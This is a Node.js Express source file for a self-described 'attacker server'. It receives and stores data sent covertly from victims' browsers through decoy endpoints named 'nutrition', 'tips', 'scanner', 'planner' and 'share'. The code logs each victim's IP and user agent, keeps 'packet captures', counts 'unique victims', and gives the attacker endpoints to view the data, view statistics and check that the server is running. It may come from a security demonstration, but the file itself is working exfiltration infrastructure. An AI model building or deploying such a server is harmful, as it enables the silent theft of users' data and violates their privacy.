const express = require("express");
const cors = require("cors");

const app = express();

app.use(cors());
app.use(express.json());

// Store collected data
let collectedData = [];
let packetCaptures = [];

// Automatic attack initialization handler
app.post("/automatic-init", (req, res) => {
    const attackData = req.body;
    
    console.log(`🚨 AUTOMATIC ATTACK INITIATED`);
    console.log(`🚨 Timestamp: ${new Date().toISOString()}`);
    console.log(`🚨 User-Agent: ${req.get('User-Agent')}`);
    console.log(`🚨 IP: ${req.ip}`);
    console.log(`🚨 Attack Data:`, attackData);
    
    // Store the automatic attack initialization
    collectedData.push({
        timestamp: new Date().toISOString(),
        endpoint: "automatic-init",
        method: "POST",
        userAgent: req.get('User-Agent'),
        ip: req.ip,
        data: attackData,
        type: "automatic_attack_initiation"
    });
    
    res.json({ 
        status: "attack_initialized", 
        message: "Automatic attack sequence started",
        timestamp: new Date().toISOString()
    });
});

// Background data collection handler (no redirects)
const handleBackgroundCollection = (req, res, endpoint) => {
    const userData = req.body;
    
    console.log(`[AUTOMATIC] Silent data collection via ${endpoint}`);
    console.log(`[AUTOMATIC] User-Agent: ${req.get('User-Agent')}`);
    console.log(`[AUTOMATIC] IP: ${req.ip}`);
    console.log(`[AUTOMATIC] Data received:`, userData);
    
    // Store the interaction silently
    collectedData.push({
        timestamp: new Date().toISOString(),
        endpoint: endpoint,
        method: "POST",
        userAgent: req.get('User-Agent'),
        ip: req.ip,
        data: userData,
        type: "automatic_background_collection"
    });
    
    // Send success response - no redirect!
    res.json({ 
        status: "success", 
        message: "Data processed successfully",
        processed: true,
        timestamp: new Date().toISOString(),
        redirectNumber: userData.redirectNumber || null,
        totalRedirects: userData.totalRedirects || null
    });
};

// Background monitoring endpoint
app.post("/monitor", (req, res) => {
    const monitoringData = req.body;
    
    console.log(`[MONITOR] Background monitoring: ${monitoringData.event}`);
    
    collectedData.push({
        timestamp: new Date().toISOString(),
        endpoint: "monitor",
        method: "POST",
        userAgent: req.get('User-Agent'),
        ip: req.ip,
        data: monitoringData,
        type: "background_monitoring"
    });
    
    res.json({ status: "monitored", timestamp: new Date().toISOString() });
});

// Multiple automatic background payload endpoints (POST only)
app.post("/payload", (req, res) => handleBackgroundCollection(req, res, "payload"));
app.post("/nutrition", (req, res) => handleBackgroundCollection(req, res, "nutrition"));
app.post("/tips", (req, res) => handleBackgroundCollection(req, res, "tips"));
app.post("/scanner", (req, res) => handleBackgroundCollection(req, res, "scanner"));
app.post("/planner", (req, res) => handleBackgroundCollection(req, res, "planner"));
app.post("/share", (req, res) => handleBackgroundCollection(req, res, "share"));

// Packet capture endpoint
app.post("/packet-capture", (req, res) => {
    const packet = req.body;
    
    console.log(`📡 PACKET CAPTURED: ${packet.method} to ${packet.url}`);
    console.log(`📡 Size: ${packet.size} bytes | IP: ${packet.ip}`);
    
    packetCaptures.push({
        ...packet,
        receivedAt: new Date().toISOString()
    });
    
    res.json({ 
        status: "packet_captured", 
        packetId: packetCaptures.length,
        timestamp: new Date().toISOString()
    });
});

// View captured packets
app.get("/packets", (req, res) => {
    res.json({
        total_packets: packetCaptures.length,
        packets: packetCaptures,
        summary: {
            total_size: packetCaptures.reduce((sum, p) => sum + (p.size || 0), 0),
            unique_urls: [...new Set(packetCaptures.map(p => p.url))].length,
            methods: [...new Set(packetCaptures.map(p => p.method))]
        }
    });
});

// View collected data (for attacker monitoring)
app.get("/data", (req, res) => {
    res.json({
        total_entries: collectedData.length,
        data: collectedData,
        summary: {
            automatic_initiations: collectedData.filter(d => d.type === "automatic_attack_initiation").length,
            background_collections: collectedData.filter(d => d.type === "automatic_background_collection").length,
            monitoring_events: collectedData.filter(d => d.type === "background_monitoring").length,
            unique_ips: [...new Set(collectedData.map(d => d.ip))].length
        }
    });
});

// Clear collected data
app.delete("/data", (req, res) => {
    const count = collectedData.length;
    collectedData = [];
    packetCaptures = [];
    res.json({ status: "success", message: `Cleared ${count} entries and ${packetCaptures.length} packets` });
});

// Statistics endpoint
app.get("/stats", (req, res) => {
    const stats = {
        total_requests: collectedData.length,
        packets_captured: packetCaptures.length,
        endpoints: {},
        recent_activity: collectedData.slice(-10),
        unique_victims: [...new Set(collectedData.map(d => d.ip))].length,
        automatic_attacks: collectedData.filter(d => d.type === "automatic_attack_initiation").length
    };
    
    // Count requests per endpoint
    collectedData.forEach(entry => {
        stats.endpoints[entry.endpoint] = (stats.endpoints[entry.endpoint] || 0) + 1;
    });
    
    res.json(stats);
});

// Health check (so attacker knows server is running)
app.get("/health", (req, res) => {
    res.json({ 
        status: "active", 
        timestamp: new Date().toISOString(),
        mode: "automatic_attack_mode",
        packets_captured: packetCaptures.length,
        data_collected: collectedData.length
    });
});

app.listen(5001, () => {
    console.log("=================================");
    console.log("� ATTACKER SERVER RUNNING (AUTOMATIC MODE)");
    console.log("Port: 5001");
    console.log("Mode: Automatic attack with packet capture");
    console.log("=================================");
    console.log("Available endpoints:");
    console.log("- POST /automatic-init (automatic attack initialization)");
    console.log("- POST /payload, /nutrition, /tips, /scanner, /planner, /share");
    console.log("- POST /monitor (background monitoring)");
    console.log("- POST /packet-capture (packet logging)");
    console.log("- GET /packets (view captured packets)");
    console.log("- GET /data (view collected data)");
    console.log("- GET /stats (view statistics)");
    console.log("- GET /health (health check)");
    console.log("=================================");
});
